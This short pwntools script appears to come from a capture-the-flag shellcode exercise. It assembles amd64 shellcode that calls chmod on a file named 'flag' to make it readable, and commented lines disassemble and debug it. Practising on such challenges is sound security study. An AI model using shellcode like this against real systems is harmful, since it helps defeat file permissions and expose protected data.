from pwn import *

context.arch = "amd64"

"""
NOTE: change cwd to /
"""

sc = """
         push 0x67616c66
         push rsp
         pop rdi
         mov sil, 4
         mov al, 0x5a
         syscall
         """
# print(disasm(asm(sc)))
# print(len(asm(sc)))

# io = gdb.debug_assembly(sc)
# io.interactive()
